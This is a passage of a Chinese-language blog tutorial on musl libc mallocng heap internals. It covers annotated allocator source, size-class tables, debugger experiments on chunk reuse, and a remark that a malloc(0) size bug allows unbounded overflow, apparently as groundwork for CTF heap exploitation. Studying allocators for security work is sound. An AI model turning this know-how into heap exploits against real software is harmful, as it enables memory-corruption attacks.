//即从头部chunk0从0x41开始一直往下的部分，包括chunk1,chunk2..以及未被分配出去的Chunk\n};\n```\n\n且group中存放的Chunk的size是在一个范围内，通过如下定义以及计算\n\n```C\n#define IB 4\n\nconst uint16_t size_classes[] = {\n    1, 2, 3, 4, 5, 6, 7, 8,\n    9, 10, 12, 15,\n    18, 20, 25, 31,\n    36, 42, 50, 63,\n    72, 84, 102, 127,\n    146, 170, 204, 255,\n    292, 340, 409, 511,\n    584, 682, 818, 1023,\n    1169, 1364, 1637, 2047,\n    2340, 2730, 3276, 4095,\n    4680, 5460, 6552, 8191,\n};\n\nstatic inline int a_ctz_32(uint32_t x)\n{\n#ifdef a_clz_32\n    return 31-a_clz_32(x&-x);\n#else\n    static const char debruijn32[32] = {\n        0, 1, 23, 2, 29, 24, 19, 3, 30, 27, 25, 11, 20, 8, 4, 13,\n        31, 22, 28, 18, 26, 10, 7, 12, 21, 17, 9, 6, 16, 5, 15, 14\n    };\n    return debruijn32[(x&-x)*0x076be629 >> 27];\n#endif\n}\nstatic inline int a_clz_32(uint32_t x)\n{\n    x >>= 1;\n    x |= x >> 1;\n    x |= x >> 2;\n    x |= x >> 4;\n    x |= x >> 8;\n    x |= x >> 16;\n    x++;\n    return 31-a_ctz_32(x);\n}\nstatic inline int size_to_class(size_t n)\n{\n    n = (n+IB-1)>>4;\n    if (n<10) return n;\n    n++;\n    int i = (28-a_clz_32(n))*4 + 8;\n    if (n>size_classes[i+1]) i+=2;\n    if (n>size_classes[i]) i++;\n    return i;\n}\n```\n\n相关汇总计算如下\n\n```\n0x0     ~ 0xc ->0\n0xd     ~ 0x1c ->1\n0x1d    ~ 0x2c ->2\n0x2d    ~ 0x3c ->3\n0x3d    ~ 0x4c ->4\n0x4d    ~ 0x5c ->5\n0x5d    ~ 0x6c ->6\n0x6d    ~ 0x7c ->7\n0x7d    ~ 0x8c ->8\n0x8d    ~ 0x9c ->9\n0x9d    ~ 0xbc ->10\n0xbd    ~ 0xec ->11\n0xed    ~ 0x11c ->12\n0x11d   ~ 0x13c ->13\n0x13d   ~ 0x18c ->14\n0x18d   ~ 0x1ec ->15\n0x1ed   ~ 0x23c ->16\n0x23d   ~ 0x29c ->17\n0x29d   ~ 0x31c ->18\n0x31d   ~ 0x3ec ->19\n0x3ed   ~ 0x47c ->20\n0x47d   ~ 0x53c ->21\n0x53d   ~ 0x65c ->22\n0x65d   ~ 0x7ec ->23\n0x7ed   ~ 0x91c ->24\n0x91d   ~ 0xa9c ->25\n0xa9d   ~ 0xcbc ->26\n0xcbd   ~ 0xfec ->27\n0xfed   ~ 0x123c ->28\n0x123d  ~ 0x153c ->29\n0x153d  ~ 0x198c ->30\n0x198d  ~ 0x1fec ->31\n0x1fed  ~ 0x247c ->32\n0x247d  ~ 0x2a9c ->33\n0x2a9d  ~ 0x331c ->34\n0x331d  ~ 0x3fec ->35\n0x3fed  ~ 0x490c ->36\n0x490d  ~ 0x553c ->37\n0x553d  ~ 0x664c ->38\n0x664d  ~ 0x7fec ->39\n0x7fed  ~ 0x923c ->40\n0x923d  ~ 0xaa9c ->41\n0xaa9d  ~ 0xccbc ->42\n0xccbd  ~ 0xffec ->43\n0xffed  ~ 0x1247c ->44\n0x1247d ~ 0x1553c ->45\n0x1553d ~ 0x1997c ->46\n```\n\n也就是说一个group中的chunk大小范围要么是`0x0 ~ 0xc `，要么是`0xd~ 0x1c`，依次类推。且依据上述转换表，一个范围对应一个索引，该索引即用来寻找meta的索引。\n\n### (3)meta\n\n而用来管理group的结构称为meta，一个meta对应一个group，而上面结构定义中的group中的meta指针即指向管理本group的meta，其定义如下\n\n```c\n//1.2.1-src/malloc/mallocng/meta.h\nstruct meta {\n    //存在多个meta，通过循环双向链表串联起来\n    //释放之后有用,没有释放的则指向本身\n\tstruct meta *prev, *next;\n\tstruct group *mem;//指向本meta管理的group\n    \n    //freed_mask是当前meta的group中被free的chunk的bitmap, 4bytes\n    //avail_mask是当前meta的group中目前可用chunk的bitmap, 4bytes\n   \t//由于是4bytes，总共32bit，那么最多可有32个chunk\n    //这里很奇怪啊，直接0/1表示可用不可用呗，那要是某个chunk在这两个free和avail的bitmap\n    //中对应的bit都为1或都为0又怎么算呢\n    //这里好像被free的chunk其freed_mask对应的bit会马上被置为1\n    //但是avail_mask对应的bit却不会马上置1，暂时标记不可用状态\n\tvolatile int avail_mask, freed_mask;\n    \n    \n\tuintptr_t last_idx:5;//group中最后一个chunk的idx索引 (5bit)\n\tuintptr_t freeable:1;//表示当前meta是否可以被free(1:可以，0:不可以)(1bit)\n    \n    //由于一个Group中的chunk的size在一个范围内，所以需要通过sizeclass来追踪计算size\n\tuintptr_t sizeclass:6;//(6bit)\n    \n\tuintptr_t maplen:8*sizeof(uintptr_t)-12;\n};\n```\n\n### (4)meta_area\n\n顾名思义，这个结构就是用来管理meta的，相关定义如下\n\n```c\n//1.2.1-src/malloc/mallocng/meta.h\nstruct meta_area\n{\n    uint64_t chevck;   \t\t//校验值\n    struct meta_area *next; //下一个分配区，即下一页(0x1000为一页)\n    int nslots;    \t\t\t//总共多少个slots\n    struct meta slots[]; \t//从其中索引其下面的meta\n};\n```\n\n分配meta时, 总是先分配一页的内存, 然后划分为多个等待分配的meta区域，meta_arena描述的就是一页内存的最开始部分。\n\n### (5)malloc_context\n\n这个就相当于整个分配内存机制总管理的一个结构，类似于glibc中的`main_arena`相关定义如下\n\n```c\n//1.2.1-src/malloc/mallocng/meta.h\nstruct malloc_context\n{\n    uint64_t secret;\n    #ifndef PAGESIZE\n    size_t pagesize;\n    #endif\n    int init_done;     //有无完成初始化\n    unsigned mmap_counter;   //mmap内存总数\n    struct meta *free_meta_head; //释放的meta组成的队列\n    struct meta *avail_meta;  //指向可用meta对象\n    //可用meta计数、可用meta_area计数、不知道\n    size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift;\n    struct meta_area *meta_area_head, *meta_area_tail; //分配区头尾指针\n    unsigned char *avail_meta_areas;\n    struct meta *active[48];   //活动的meta\n    size_t usage_by_class[48]; //这个大小级别使用了多少内存\n    uint8_t unmap_seq[32], bounces[32];\n    uint8_t seq;\n    uintptr_t brk;\n};\n\nextern struct malloc_context ctx;\n```\n\n总的来说，数据结构大致如下所示\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203172053962.png)\n\n\n\n## 2.维护方式\n\n使用`freed_mask`和`avail_mask`来确定，如下图所示，在`active[2]`(即size在0x1d~0x2c的chunk)中现在有\n\n![image-20220317141333259](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171413463.png)\n\n我们将active[2]中`avail_mask`置1的chunk都申请出来之后，即代表这个group无法接着为我们的申请提供chunk的话，比如这里就是需要申请出chunk0~chunk9，然后再申请的话就会进行判断\n\n- 如果该group中存在被free的chunk，即`freed_mask`中置1的chunk，那么就返回该chunk，这里也存在一个顺序问题，不会管是先释放还是后释放的，只会从上到下进行分配，如下代码\n\n```python\nfor i in range(8):\n\tadd_malloc(0x2c)\n\tedit(i,0x10,p8(i)*0x10)\n\t\nfor i in range(6,-1,-1):\n\tfree(i)\n\ndbg()    \nadd_malloc(0x2c)\nadd_malloc(0x2c)\npause()\nadd_malloc(0x2c)\nedit(10,0x10,p8(0x11)*0x10)\npause()\n```\n\n第一次`dbg()`断点的地方先申请8个chunk，那么现在在该group的`avail_mask`中应该为`1100000000` 而`freed_mask`应该为`1111111`\n\n![image-20220317143430652](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171434757.png)\n\n我们接着申请两个Chunk，在第二次断点处，其`avail_mask`应该为0，而`freed_mask`不变\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171438716.png)\n\n这时候再申请一个chunk，即可申请出group中从上往下数首个被free的chunk，这时`freed_mask`被清空，`avail_mask`依据`freed_mask`进行重置\n\n![image-20220317144243283](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171442484.png)\n\n其实总而言之就是当耗尽group中的avail_mask对应的可用chunk之后，再申请就会检测该group中是否存在被free的chunk，存在就会对被free的chunk进行处理，归到avail中，相应的avail_mask和freed_mask发生变化。\n\n而如果我们改变释放顺序，依然申请出首个可用chunk，和释放顺序无关\n\n```python\nfor i in range(8):\n\tadd_malloc(0x2c)\n\tedit(i,0x10,p8(i)*0x10)\n\t\nfor i in range(0,7):\n\tfree(i)\ndbg()\nadd_malloc(0x2c)\nadd_malloc(0x2c)\npause()\nadd_malloc(0x2c)\nedit(10,0x10,p8(0x11)*0x10)\npause()\n```\n\n如下效果\n\n![image-20220317144709749](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171447956.png)\n\n- 当申请到该group中无可用chunk时，尝试从该size的meta队列中的其他meta对应的group来申请chunk。\n\n```python\nfor i in range(11):\n\tadd_malloc(0x2c)\n\tedit(i,0x10,p8(i)*0x10)\nfree(0)\nfor i in range(11):\n\tadd_malloc(0x2c)\n\tedit(i+11,0x10,p8(i+11)*0x10)\ndbg()\n```\n\n如下图所示，我们在申请出另外一个meta-group(meta1)之后，free掉第一个meta-group(meta0)中的Chunk，然后当我们消耗完meta1中的空间之后，再申请chunk的话会检测该size的meta队列，试图从中申请chunk出来，如下图即从meta0中申请出我们刚刚释放的Chunk。\n\n![image-20220317153130762](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171531940.png)\n\n- 当该size的meta队列中无avail的chunk无free的chunk时，就会再分配一个`meta-group`来进行再分配\n\n```python\nfor i in range(11):\n\tadd_malloc(0x2c)\n\tedit(i,0x10,p8(i)*0x10)\ndbg()\n```\n\n原来的group已经不可用了，所以新分配了一个group\n\n![image-20220317144959413](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171449585.png)\n\n\n\n## 3.关键函数\n\n### (1)malloc\n\n参考：\n\n[musl-1.2.x堆部分源码分析 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/246929#h2-3)\n\n[从musl libc 1.1.24到1.2.2 学习pwn姿势 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/253566#h3-4)\n\n```c\n//v1.2.1  /src/malloc/mallocng/malloc.c\nvoid *malloc(size_t n)\n{\n\tif (size_overflows(n)) return 0;//是否超过申请的最大值，这个最大值不知道多少\n    /*\n    static inline int size_overflows(size_t n)\n    {\n        if (n >= SIZE_MAX/2 - 4096) {\n            errno = ENOMEM;\n            return 1;\n        }\n        return 0;\n    }\n\t*/\n\tstruct meta *g;\n\tuint32_t mask, first;\n\tint sc;\n\tint idx;\n\tint ctr;\n\n    //mmap分配  #define MMAP_THRESHOLD 131052(0x1FFEC)\n\tif (n >= MMAP_THRESHOLD) {\n\t\tsize_t needed = n + IB + UNIT;\n\t\tvoid *p = mmap(0, needed, PROT_READ|PROT_WRITE,\n\t\t\tMAP_PRIVATE|MAP_ANON, -1, 0);\n\t\tif (p==MAP_FAILED) return 0;\n\t\twrlock();\n\t\tstep_seq();\n\t\tg = alloc_meta();\n\t\tif (!g) {\n\t\t\tunlock();\n\t\t\tmunmap(p, needed);\n\t\t\treturn 0;\n\t\t}\n        //记录分配信息\n\t\tg->mem = p;\n\t\tg->mem->meta = g;\n\t\tg->last_idx = 0;\n\t\tg->freeable = 1;\n\t\tg->sizeclass = 63;//meta的sizeclass为63代表mmap分配\n\t\tg->maplen = (needed+4095)/4096;\n\t\tg->avail_mask = g->freed_mask = 0;\n\t\t// use a global counter to cycle offset in\n\t\t// individually-mmapped allocations.\n        //记录分配个数\n\t\tctx.mmap_counter++;\n\t\tidx = 0;\n\t\tgoto success;\n\t}\n\n    //寻找size对应的meta，ctx.active[sc]\n\tsc = size_to_class(n);\n\trdlock();\n\tg = ctx.active[sc];\n\n\t// use coarse size classes initially when there are not yet\n\t// any groups of desired size. this allows counts of 2 or 3\n\t// to be allocated at first rather than having to start with\n\t// 7 or 5, the min counts for even size classes.\n    //对应size的meta为空且4=<sc<=32且不等于6且为偶数并且该sc没有正在使用的chunk\n    //那么申请的chunk就会从sc+1开始申请，比如申请0x8c，对应的sc应该是8，但是由于\n    //满足这个条件，sc为8的meta没有正在使用的chunk，对应就会从sc+1=9处开始申请\n\tif (!g && sc>=4 && sc<32 && sc!=6 && !(sc&1) && !ctx.usage_by_class[sc]) {\n\t\tsize_t usage = ctx.usage_by_class[sc|1];\n\t\t// if a new group may be allocated, count it toward\n\t\t// usage in deciding if we can use coarse class.\n\t\tif (!ctx.active[sc|1] || (!ctx.active[sc|1]->avail_mask\n\t\t    && !ctx.active[sc|1]->freed_mask))\n\t\t\tusage += 3;\n\t\tif (usage <= 12)\n\t\t\tsc |= 1;\n\t\tg = ctx.active[sc];\n\t}\n\n    //取到avail_mask最低位的1，置零之后计算idx\n    //根据idx从group中寻找可用chunk\n\tfor (;;) {\n        //meta中的可用内存的bitmap, 如果g为0那么就设为0, 表示没有可用chunk\n\t\tmask = g ? g->avail_mask : 0;\n        //找到avail_mask的bit中第一个为1的bit\n\t\tfirst = mask&-mask;\n        //如果没找到就停止\n\t\tif (!first) break;\n        //设置avail_mask中first对应的bit为0\n        //下面是锁机制，不太懂\n\t\tif (RDLOCK_IS_EXCLUSIVE || !MT)\n\t\t\tg->avail_mask = mask-first;\n\t\telse if (a_cas(&g->avail_mask, mask, mask-first)!=mask)\n\t\t\tcontinue;\n        //找到之后设置avail_mask之后转为idx, 结束\n\t\tidx = a_ctz_32(first);\n\t\tgoto success;\n\t}\n\tupgradelock();\n\n\tidx = alloc_slot(sc, n);\n\tif (idx < 0) {\n\t\tunlock();\n\t\treturn 0;\n\t}\n    //找到对应meta\n\tg = ctx.active[sc];\n\nsuccess:\n\tctr = ctx.mmap_counter;\n\tunlock();\n    //从g中分配第idx个chunk, 大小为n\n\treturn enframe(g, idx, n, ctr);\n}\n```\n\n- 判断有无超过mmap的阈值, 如果超过就mmap分配\n\n- 如果没有超过, size转sc之后, 通过ctx.active[sc]找到对应的meta队列, 尝试从队列中首个meta里分配chunk\n- 如果这个队列为空, 或者这个meta的avail_mask里面没有合适的chunk, 那就调用alloc_slot()获取chunk\n- 找到group与idx之后通过enframe()分配出这个chunk\n\n#### 🔺注：\n\n需要注意的是，并没有对size为0进行限制，所以我们也可以申请size为0的Chunk，万一如下代码所示\n\n```c\nsize = readint(\"size?\", a2);\n*(_QWORD *)v5 = malloc(size);\nv5[2] = size - 1;\nputs(\"Contnet?\");\nreturn readn(*(_QWORD *)v5, v5[2]);\n```\n\n那么size为0就可以无限溢出了啊\n\n#### ①alloc_slot\n\n```c\n//v1.2.1 /src/malloc/mallocng/malloc.c\nstatic int alloc_slot(int sc, size_t req)\n{\n    //尝试在该size的meta对应的active[sc]队列内部分配chunk\n\tuint32_t first = try_avail(&ctx.active[sc]);\n\tif (first) return a_ctz_32(first);//分配成功直接返回\n\n    //如果该size的meta对应的active[sc]队列中没有合适的avail_mask\n    //和freed_mask对应的chunk，那么就再分配一个meta-group，插入队列中\n\tstruct meta *g = alloc_group(sc, req);\n\tif (!g) return -1;\n\n\tg->avail_mask--;\n    //新分配的g入队\n\tqueue(&ctx.active[sc], g);\n\treturn 0;\n}\n```\n\n- 首先会通过`try_avail()`在以下位置寻找可用的chunk,\n  - ctx.active[sc]的meta-group的freed_mask中\n  - 队列中其他meta-group的avail_mask和freed_mask中\n- 如果失败,或者这个队列本来就空, 那么就会调用`alloc_group()`直接分配一个新的meta与对应的group，然后调用queue插入ctx.avtive[sc]这个队列中\n\n#### ②try_avail\n\n```c\n//v1.2.1 /src/malloc/mallocng/malloc.c\nstatic uint32_t try_avail(struct meta **pm)\n{\n    struct meta *m = *pm;\n    uint32_t first;\n    if (!m) return 0;//如果ctx.active[sc]==NULL, 即该队列为空，直接返回\n\n    //ctx.active[sc]对应的meta-group的avail_mask中无可用chunk\n    uint32_t mask = m->avail_mask;\n    if (!mask) {\n        if (!m) return 0;\n        //ctx.active[sc]对应的meta-group的freed_mask中也没有chunk时\n        //代表都在使用中，从队列中弹出该meta-group\n        if (!m->freed_mask) {\n            dequeue(pm, m);\n            m = *pm;\n            if (!m) return 0;\n        } else {\n            //获取队列中下一个meta-group\n            m = m->next;\n            *pm = m;\n        }\n\t\t\n        //如果这个meta-group中所有的chunk都被释放了, 那么就再下一个meta-group\n        //即不从下一个全free或者没有申请chunk的meta-group中申请chunk\n        mask = m->freed_mask;\n        // skip fully-free group unless it's the only one\n        // or it's a permanently non-freeable group\n        if (mask == (2u<<m->last_idx)-1 && m->freeable) {\n            m = m->next;\n            *pm = m;\n            mask = m->freed_mask;\n        }\n\n        //没太看懂想干啥\n        // activate more slots in a not-fully-active group\n        // if needed, but only as a last resort. prefer using\n        // any other group with free slots. this avoids\n        // touching & dirtying as-yet-unused pages.\n        if (!(mask & ((2u<<m->mem->active_idx)-1))) {\n            if (m->next != m) {\n                m = m->next;\n                *pm = m;\n            } else {\n                int cnt = m->mem->active_idx + 2;\n                int size = size_classes[m->sizeclass]*UNIT;\n                int span = UNIT + size*cnt;\n                // activate up to next 4k boundary\n                while ((span^(span+size-1)) < 4096) {\n                    cnt++;\n                    span += size;\n                }\n                if (cnt > m->last_idx+1)\n                    cnt = m->last_idx+1;\n                m->mem->active_idx = cnt-1;\n            }\n        }\n        //重新设置这个meta-group，freed_mask和avail_mask的设置\n        mask = activate_group(m);\n        /*其实也就是设置设置一下freed_mask和avail_mask\n        static inline uint32_t activate_group(struct meta *m)\n        {\n            assert(!m->avail_mask);\n            uint32_t mask, act = (2u<<m->mem->active_idx)-1;\n            do mask = m->freed_mask;\n            while (a_cas(&m->freed_mask, mask, mask&~act)!=mask);\n            return m->avail_mask = mask & act;\n        }\n        */\n        assert(mask);\n        decay_bounces(m->sizeclass);\n    }\n    //取出\n    first = mask&-mask;\n    m->avail_mask = mask-first;\n    return first;\n}\n```\n\n- 查看这个meta-group中freed_mask中有无chunk，如果freed_mask为0, 说明这个meta-group中没有释放的chunk，就从队列中取出\n- 如果有的话就会通过`active_group()`把freed_mask中的chunk转移到avail_mask中\n\n#### ③alloc_group\n\n```c\n//v1.2.1 /src/malloc/mallocng/malloc.c\n//用来分配一个新的group\nstatic struct meta *alloc_group(int sc, size_t req)\n{\n    size_t size = UNIT*size_classes[sc];\n    int i = 0, cnt;\n    unsigned char *p;\n    //先分配一个meta管理group\n    struct meta *m = alloc_meta();\n    if (!m) return 0;\n    size_t usage = ctx.usage_by_class[sc];\n    size_t pagesize = PGSZ;\n    int active_idx;\n    if (sc < 9) {\n        while (i<2 && 4*small_cnt_tab[sc][i] > usage)\n            i++;\n        cnt = small_cnt_tab[sc][i];\n    } else {\n        // lookup max number of slots fitting in power-of-two size\n        // from a table, along with number of factors of two we\n        // can divide out without a remainder or reaching 1.\n        cnt = med_cnt_tab[sc&3];\n\n        // reduce cnt to avoid excessive eagar allocation.\n        while (!(cnt&1) && 4*cnt > usage)\n            cnt >>= 1;\n\n        // data structures don't support groups whose slot offsets\n        // in units don't fit in 16 bits.\n        while (size*cnt >= 65536*UNIT)\n            cnt >>= 1;\n    }\n\n    // If we selected a count of 1 above but it's not sufficient to use\n    // mmap, increase to 2. Then it might be; if not it will nest.\n    if (cnt==1 && size*cnt+UNIT <= pagesize/2) cnt = 2;\n\n    // All choices of size*cnt are \"just below\" a power of two, so anything\n    // larger than half the page size should be allocated as whole pages.\n    if (size*cnt+UNIT > pagesize/2) {\n        // check/update bounce counter to start/increase retention\n        // of freed maps, and inhibit use of low-count, odd-size\n        // small mappings and single-slot groups if activated.\n        int nosmall = is_bouncing(sc);\n        account_bounce(sc);\n        step_seq();\n\n        // since the following count reduction opportunities have\n        // an absolute memory usage cost, don't overdo them. count\n        // coarse usage as part of usage.\n        if (!(sc&1) && sc<32) usage += ctx.usage_by_class[sc+1];\n\n        // try to drop to a lower count if the one found above\n        // increases usage by more than 25%. these reduced counts\n        // roughly fill an integral number of pages, just not a\n        // power of two, limiting amount of unusable space.\n        if (4*cnt > usage && !nosmall) {\n            if (0);\n            else if ((sc&3)==1 && size*cnt>8*pagesize) cnt = 2;\n            else if ((sc&3)==2 && size*cnt>4*pagesize) cnt = 3;\n            else if ((sc&3)==0 && size*cnt>8*pagesize) cnt = 3;\n            else if ((sc&3)==0 && size*cnt>2*pagesize) cnt = 5;\n        }\n        size_t needed = size*cnt + UNIT;\n        needed += -needed & (pagesize-1);\n\n        // produce an individually-mmapped allocation if usage is low,\n        // bounce counter hasn't triggered, and either it saves memory\n        // or it avoids eagar slot allocation without wasting too much.\n        if (!nosmall && cnt<=7) {\n            req += IB + UNIT;\n            req += -req & (pagesize-1);\n            if (req<size+UNIT || (req>=4*pagesize && 2*cnt>usage)) {\n                cnt = 1;\n                needed = req;\n            }\n        }\n\n        p = mmap(0, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);\n        if (p==MAP_FAILED) {\n            free_meta(m);\n            return 0;\n        }\n        m->maplen = needed>>12;\n        ctx.mmap_counter++;\n        active_idx = (4096-UNIT)/size-1;\n        if (active_idx > cnt-1) active_idx = cnt-1;\n        if (active_idx < 0) active_idx = 0;\n    } else {\n        int j = size_to_class(UNIT+cnt*size-IB);\n        int idx = alloc_slot(j, UNIT+cnt*size-IB);\n        if (idx < 0) {\n            free_meta(m);\n            return 0;\n        }\n        struct meta *g = ctx.active[j];\n        p = enframe(g, idx, UNIT*size_classes[j]-IB, ctx.mmap_counter);\n        m->maplen = 0;\n        p[-3] = (p[-3]&31) | (6<<5);\n        for (int i=0; i<=cnt; i++)\n            p[UNIT+i*size-4] = 0;\n        active_idx = cnt-1;\n    }\n    ctx.usage_by_class[sc] += cnt;\n    m->avail_mask = (2u<<active_idx)-1;\n    m->freed_mask = (2u<<(cnt-1))-1 - m->avail_mask;\n    m->mem = (void *)p;\n    m->mem->meta = m;\n    m->mem->active_idx = active_idx;\n    m->last_idx = cnt-1;\n    m->freeable = 1;\n    m->sizeclass = sc;\n    return m;\n}\n```\n\n通过mmap分配Group，初始化相关信息。\n\n#### ④alloc_meta\n\n```c\n//v1.2.1 /src/malloc/mallocng/malloc.c\n//用来分配meta对象\nstruct meta *alloc_meta(void)\n{\n\tstruct meta *m;\n\tunsigned char *p;\n    //判断ctx是否完成初始化，没完成就整一下\n\tif (!ctx.init_done) {\n#ifndef PAGESIZE\n\t\tctx.pagesize = get_page_size();\n#endif\n\t\tctx.secret = get_random_secret();\n\t\tctx.init_done = 1;\n\t}\n    \n    //pagesize的设置\n\tsize_t pagesize = PGSZ;\n\tif (pagesize < 4096) pagesize = 4096;\n    \n    //首先看能不能从free_meta_head中获得meta对象，一般是将一个meta-group中的\n    //chunk全部分配完然后全部释放完就会自动进入meta-group的释放阶段，成功就进入\n    //进入到ctx.free_meta_head中\n\tif ((m = dequeue_head(&ctx.free_meta_head))) return m;\n    \n    //ctx中如果没有可用的meat对象\n\tif (!ctx.avail_meta_count) {\n\t\tint need_unprotect = 1;\n        //ctx中没有空闲的meat对象且ctx.brk不为-1\n\t\tif (!ctx.avail_meta_area_count && ctx.brk!=-1) {\n            //分配一页内存0x1000\n\t\t\tuintptr_t new = ctx.brk + pagesize;\n\t\t\tint need_guard = 0;\n            //如果ctx.brk为0,一般在初始化的时候\n\t\t\tif (!ctx.brk) {\n\t\t\t\tneed_guard = 1;\n                //调用brk()获取堆地址\n\t\t\t\tctx.brk = brk(0);\n\t\t\t\t// some ancient kernels returned _ebss\n\t\t\t\t// instead of next page as initial brk.\n\t\t\t\tctx.brk += -ctx.brk & (pagesize-1);\n\t\t\t\tnew = ctx.brk + 2*pagesize;\n\t\t\t}\n            //brk()分配heap到new地址失败\n\t\t\tif (brk(new) != new) {\n\t\t\t\tctx.brk = -1;\n\t\t\t} \n            //分配成功\n            else {\n                //保护页, 在brk后面映射一个不可用的页(PROT_NONE),\n                //如果堆溢出到这里就会发送SIGV\n\t\t\t\tif (need_guard) mmap((void *)ctx.brk, pagesize,\n\t\t\t\t\tPROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0);\n\t\t\t\tctx.brk = new;\n                //把这一页全划分为meta对象\n\t\t\t\tctx.avail_meta_areas = (void *)(new - pagesize);\n\t\t\t\tctx.avail_meta_area_count = pagesize>>12;\n\t\t\t\tneed_unprotect = 0;\n\t\t\t}\n\t\t}\n        //如果前面brk()分配失败了, 直接mmap匿名映射一片PROT_NONE的内存再划分\n\t\tif (!ctx.avail_meta_area_count) {\n\t\t\tsize_t n = 2UL << ctx.meta_alloc_shift;\n\t\t\tp = mmap(0, n*pagesize, PROT_NONE,\n\t\t\t\tMAP_PRIVATE|MAP_ANON, -1, 0);\n\t\t\tif (p==MAP_FAILED) return 0;\n\t\t\tctx.avail_meta_areas = p + pagesize;\n\t\t\tctx.avail_meta_area_count = (n-1)*(pagesize>>12);\n\t\t\tctx.meta_alloc_shift++;\n\t\t}\n        //如果avail_meta_areas与4K对齐, 那么就说明这片区域是刚刚申请的一页\n        //所以需要修改内存的权限,更改为读写保护的\n\t\tp = ctx.avail_meta_areas;\n\t\tif ((uintptr_t)p & (pagesize-1)) need_unprotect = 0;\n\t\tif (need_unprotect)\n\t\t\tif (mprotect(p, pagesize, PROT_READ|PROT_WRITE)\n\t\t\t    && errno != ENOSYS)\n\t\t\t\treturn 0;\n\t\tctx.avail_meta_area_count--;\n\t\tctx.avail_meta_areas = p + 4096;\n\t\tif (ctx.meta_area_tail) {\n\t\t\tctx.meta_area_tail->next = (void *)p;\n\t\t} else {\n\t\t\tctx.meta_area_head = (void *)p;\n\t\t}\n        \n        //初始化ctx的相关信息\n\t\tctx.meta_area_tail = (void *)p;\n\t\tctx.meta_area_tail->check = ctx.secret;\n\t\tctx.avail_meta_count = ctx.meta_area_tail->nslots\n\t\t\t= (4096-sizeof(struct meta_area))/sizeof *m;\n\t\tctx.avail_meta = ctx.meta_area_tail->slots;\n\t}\n    //ctx的可用meta对象数组中有能用的,从中直接分配出来即可\n\tctx.avail_meta_count--;\n\tm = ctx.avail_meta++;\n\tm->prev = m->next = 0;\n\treturn m;\n}\n```\n\n- 查看ctx是否完成初始化，没完成就初始化一下\n- 如果ctx.free_meta_head链表中有空闲的meta, 那么直接从这里分配一个meta\n- 如果ctx.avail_meta_count>0，代表最开始分配出来的meta对象还没有被用完，直接从ctx.avail_meta对象数组中分配一个\n- 如果ctx.avail_meta_count=0，则代表最开始分配的meta对象已经用完，没有可用的，那么就说明需要向OS申请内存存放meta\n  - 先通过brk分配1页，如果分配成功，则将新的内存页直接划分为meta对象，然后修改之后的内存页的权限。\n  - 如果brk失败的话则会通过mmap()分配许多页内存, 但是这些内存都是PROT_NONE的, 属于guard page, 堆溢出到这些页面会引发SIGV, 而meta不使用开头与结尾的一页, 防止被溢出\n- 分配成功后设置ctx中的meta_area_tail, avail_meta_cnt等信息, 把新分配的一页作为待划分的meta。\n\n#### ⑤enframe\n\n```c\n//v1.2.1 /src/malloc/mallocng/meta.h\n//分配chunk时，设置group用的函数\nstatic inline void *enframe(struct meta *g, int idx, size_t n, int ctr)\n{\n\tsize_t stride = get_stride(g);\n\tsize_t slack = (stride-IB-n)/UNIT;\n\tunsigned char *p = g->mem->storage + stride*idx;\n\tunsigned char *end = p+stride-IB;\n\t// cycle offset within slot to increase interval to address\n\t// reuse, facilitate trapping double-free.\n\tint off = (p[-3] ? *(uint16_t *)(p-2) + 1 : ctr) & 255;\n\tassert(!p[-4]);\n\tif (off > slack) {\n\t\tsize_t m = slack;\n\t\tm |= m>>1; m |= m>>2; m |= m>>4;\n\t\toff &= m;\n\t\tif (off > slack) off -= slack+1;\n\t\tassert(off <= slack);\n\t}\n\tif (off) {\n\t\t// store offset in unused header at offset zero\n\t\t// if enframing at non-zero offset.\n\t\t*(uint16_t *)(p-2) = off;\n\t\tp[-3] = 7<<5;\n\t\tp += UNIT*off;\n\t\t// for nonzero offset there is no permanent check\n\t\t// byte, so make one.\n\t\tp[-4] = 0;\n\t}\n\t*(uint16_t *)(p-2) = (size_t)(p-g->mem->storage)/UNIT;\n\tp[-3] = idx;\n\tset_size(p, end, n);\n\treturn p;\n}\n```\n\n### (2)free\n\n```c\nvoid free(void *p)\n{\n\tif (!p) return;\n   \t//获取相关信息\n\tstruct meta *g = get_meta(p);\n\tint idx = get_slot_index(p);\n\tsize_t stride = get_stride(g);\n\tunsigned char *start = g->mem->storage + stride*idx;\n\tunsigned char *end = start + stride - IB;\n\tget_nominal_size(p, end);\n    \n    //计算这个chunk对应avail_mask和freed_mask的bitmap\n\tuint32_t self = 1u<<idx, all = (2u<<g->last_idx)-1;\n\t((unsigned char *)p)[-3] = 255;\n\t// invalidate offset to group header, and cycle offset of\n\t// used region within slot if current offset is zero.\n\t*(uint16_t *)((char *)p-2) = 0;\n\n\t// release any whole pages contained in the slot to be freed\n\t// unless it's a single-slot group that will be unmapped.\n\tif (((uintptr_t)(start-1) ^ (uintptr_t)end) >= 2*PGSZ && g->last_idx) {\n\t\tunsigned char *base = start + (-(uintptr_t)start & (PGSZ-1));\n\t\tsize_t len = (end-base) & -PGSZ;\n\t\tif (len) madvise(base, len, MADV_FREE);\n\t}\n\n\t// atomic free without locking if this is neither first or last slot\n    //在meta->freed_mask中标记一下, 表示这个chunk已经被释放了\n\tfor (;;) {\n\t\tuint32_t freed = g->freed_mask;\n\t\tuint32_t avail = g->avail_mask;\n\t\tuint32_t mask = freed | avail;\n\t\tassert(!(mask&self));//要释放的chunk应该既不在freed中, 也不在avail中\n        \n/*\n1.如果满足  mask+self==all  , 那就说明释放了这个chunk之后这个group\n中所有chunk都被释放,就需要调用nontrivial_free回收整个meta-group\n因此这个meta需要调用nontrivial_free()回收这个group\n2.如果满足  !freed  ,那么就说明该meta-group中没有被释放的chunk,有可能是第一次从该\n有可能这个group全部被分配出去了, 